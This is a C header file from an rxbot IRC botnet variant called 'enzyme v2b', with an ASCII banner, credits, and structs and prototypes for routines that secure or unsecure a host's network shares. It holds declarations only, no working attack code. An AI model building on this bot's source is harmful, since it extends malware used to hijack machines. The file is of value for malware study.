/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

typedef struct SECURE
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL secure;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SECURE;

typedef struct NetShares
{
	char *ShareName;
	char *SharePath;

} NetShares;

DWORD WINAPI SecureThread(LPVOID param);
BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param);
#endif